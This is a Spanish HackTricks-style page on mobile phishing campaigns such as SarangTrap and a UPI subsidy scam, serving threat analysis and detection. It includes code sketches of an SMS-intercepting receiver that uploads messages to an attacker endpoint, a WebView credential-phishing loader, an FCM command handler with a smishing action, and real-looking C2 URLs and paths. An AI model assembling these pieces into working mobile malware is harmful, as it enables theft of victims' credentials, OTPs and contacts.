# Phishing Móvil y Distribución de Aplicaciones Maliciosas (Android e iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cubre técnicas utilizadas por actores de amenazas para distribuir **APKs maliciosos de Android** y **perfiles de configuración móvil de iOS** a través de phishing (SEO, ingeniería social, tiendas falsas, aplicaciones de citas, etc.).
> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.

## Flujo de Ataque

1. **Infraestructura SEO/Phishing**
* Registrar docenas de dominios similares (citas, compartir en la nube, servicio de coches…).
– Usar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionarse en Google.
– Alojar *tanto* las instrucciones de instalación de Android (`.apk`) como de iOS en la misma página de destino.
2. **Descarga de Primera Etapa**
* Android: enlace directo a un APK *no firmado* o de “tienda de terceros”.
* iOS: `itms-services://` o enlace HTTPS simple a un perfil **mobileconfig** malicioso (ver abajo).
3. **Ingeniería Social Post-instalación**
* En la primera ejecución, la aplicación solicita un **código de invitación/verificación** (ilusión de acceso exclusivo).
* El código se **envía por POST a través de HTTP** al Comando y Control (C2).
* C2 responde `{"success":true}` ➜ el malware continúa.
* Un análisis dinámico en sandbox/AV que nunca envía un código válido no ve **comportamiento malicioso** (evasión).
4. **Abuso de Permisos en Tiempo de Ejecución** (Android)
* Los permisos peligrosos solo se solicitan **después de una respuesta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Las versiones más antiguas también solicitaban permisos de SMS -->
```
* Las variantes recientes **eliminan `<uses-permission>` para SMS de `AndroidManifest.xml`** pero dejan la ruta de código Java/Kotlin que lee SMS a través de reflexión ⇒ reduce la puntuación estática mientras sigue siendo funcional en dispositivos que otorgan el permiso a través del abuso de `AppOps` o objetivos antiguos.
5. **Interfaz de Facade y Recolección en Segundo Plano**
* La aplicación muestra vistas inofensivas (visor de SMS, selector de galería) implementadas localmente.
* Mientras tanto, exfiltra:
- IMEI / IMSI, número de teléfono
- Volcado completo de `ContactsContract` (array JSON)
- JPEG/PNG de `/sdcard/DCIM` comprimido con [Luban](https://github.com/Curzibn/Luban) para reducir tamaño
- Contenido opcional de SMS (`content://sms`)
Los payloads son **comprimidos en lotes** y enviados a través de `HTTP POST /upload.php`.
6. **Técnica de Entrega en iOS**
* Un solo **perfil de configuración móvil** puede solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc. para inscribir el dispositivo en una supervisión similar a “MDM”.
* Instrucciones de ingeniería social:
1. Abrir Configuración ➜ *Perfil descargado*.
2. Tocar *Instalar* tres veces (capturas de pantalla en la página de phishing).
3. Confiar en el perfil no firmado ➜ el atacante obtiene derechos de *Contactos* y *Fotos* sin revisión de la App Store.
7. **Capa de Red**
* HTTP simple, a menudo en el puerto 80 con encabezado HOST como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sin TLS → fácil de detectar).

## Pruebas Defensivas / Consejos para Red-Team

* **Evasión de Análisis Dinámico** – Durante la evaluación de malware, automatizar la fase del código de invitación con Frida/Objection para alcanzar la rama maliciosa.
* **Diferencia entre Manifest y Runtime** – Comparar `aapt dump permissions` con `PackageManager#getRequestedPermissions()` en tiempo de ejecución; la falta de permisos peligrosos es una señal de alerta.
* **Canario de Red** – Configurar `iptables -p tcp --dport 80 -j NFQUEUE` para detectar ráfagas de POST no sólidas después de la entrada del código.
* **Inspección de mobileconfig** – Usar `security cms -D -i profile.mobileconfig` en macOS para listar `PayloadContent` y detectar derechos excesivos.

## Ideas de Detección para Blue-Team

* **Transparencia de Certificados / Análisis de DNS** para detectar ráfagas repentinas de dominios ricos en palabras clave.
* **Regex de User-Agent y Ruta**: `(?i)POST\s+/(check|upload)\.php` de clientes Dalvik fuera de Google Play.
* **Telemetría de Código de Invitación** – POST de códigos numéricos de 6 a 8 dígitos poco después de la instalación del APK puede indicar preparación.
* **Firma de MobileConfig** – Bloquear perfiles de configuración no firmados a través de políticas MDM.

## Fragmento Útil de Frida: Bypass Automático del Código de Invitación
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Este patrón se ha observado en campañas que abusan de temas de beneficios gubernamentales para robar credenciales y OTPs de UPI en India. Los operadores encadenan plataformas reputables para la entrega y la resiliencia.

### Cadena de entrega a través de plataformas de confianza
- Cebo de video de YouTube → la descripción contiene un enlace corto
- Enlace corto → sitio de phishing de GitHub Pages imitando el portal legítimo
- El mismo repositorio de GitHub alberga un APK con una falsa insignia de “Google Play” que enlaza directamente al archivo
- Páginas de phishing dinámicas viven en Replit; el canal de comando remoto utiliza Firebase Cloud Messaging (FCM)

### Dropper con carga útil incrustada e instalación offline
- El primer APK es un instalador (dropper) que envía el malware real en `assets/app.apk` y solicita al usuario que desactive Wi‑Fi/datos móviles para atenuar la detección en la nube.
- La carga útil incrustada se instala bajo una etiqueta inocua (por ejemplo, “Actualización Segura”). Después de la instalación, tanto el instalador como la carga útil están presentes como aplicaciones separadas.

Consejo de triaje estático (grep para cargas útiles incrustadas):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descubrimiento dinámico de puntos finales a través de un enlace corto
- El malware obtiene una lista de puntos finales activos en texto plano, separados por comas, de un enlace corto; transformaciones de cadena simples producen la ruta final de la página de phishing.

Ejemplo (sanitizado):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-código:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Recolección de credenciales UPI basada en WebView
- El paso “Realizar pago de ₹1 / UPI‑Lite” carga un formulario HTML del atacante desde el punto final dinámico dentro de un WebView y captura campos sensibles (teléfono, banco, PIN de UPI) que son `POST`eados a `addup.php`.

Cargador mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Autopropagación e interceptación de SMS/OTP
- Se solicitan permisos agresivos en el primer uso:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Los contactos se utilizan para enviar masivamente SMS de smishing desde el dispositivo de la víctima.
- Los SMS entrantes son interceptados por un receptor de difusión y se cargan con metadatos (remitente, cuerpo, ranura SIM, ID aleatorio por dispositivo) a `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- La carga útil se registra en FCM; los mensajes push llevan un campo `_type` que se utiliza como un interruptor para activar acciones (por ejemplo, actualizar plantillas de texto de phishing, alternar comportamientos).

Ejemplo de carga útil de FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esbozo del controlador:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Patrones de caza e IOCs
- APK contiene carga secundaria en `assets/app.apk`
- WebView carga el pago desde `gate.htm` y exfiltra a `/addup.php`
- Exfiltración de SMS a `/addsm.php`
- Obtención de configuración impulsada por enlaces cortos (por ejemplo, `rebrand.ly/*`) que devuelve puntos finales CSV
- Aplicaciones etiquetadas como “Actualización/Actualización Segura” genéricas
- Mensajes `data` de FCM con un discriminador `_type` en aplicaciones no confiables

### Ideas de detección y defensa
- Marcar aplicaciones que instruyen a los usuarios a desactivar la red durante la instalación y luego cargar lateralmente un segundo APK desde `assets/`.
- Alertar sobre la tupla de permisos: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flujos de pago basados en WebView.
- Monitoreo de salida para `POST /addup.php|/addsm.php` en hosts no corporativos; bloquear infraestructura conocida.
- Reglas de EDR móvil: aplicación no confiable registrándose para FCM y ramificándose en un campo `_type`.

---

## Referencias

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
